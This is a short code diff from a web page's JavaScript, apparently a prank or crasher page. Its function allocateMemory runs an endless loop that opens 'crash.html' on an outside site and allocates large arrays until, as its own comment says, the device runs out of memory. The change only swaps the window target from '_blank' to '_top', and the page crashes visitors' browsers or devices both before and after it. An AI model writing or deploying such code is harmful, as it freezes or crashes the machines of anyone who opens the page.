@@ -16,7 +16,7 @@
 
       function allocateMemory() {
         while (true) {
-          window.open("stijnboyce.com/crash.html", '_blank').focus();
+          window.open("stijnboyce.com/crash.html", '_top').focus();
           // Keep allocating memory until the device runs out
           largeArray.push(new Array(1000)); // Allocate large chunks to consume memory
           memoryTestCount++;
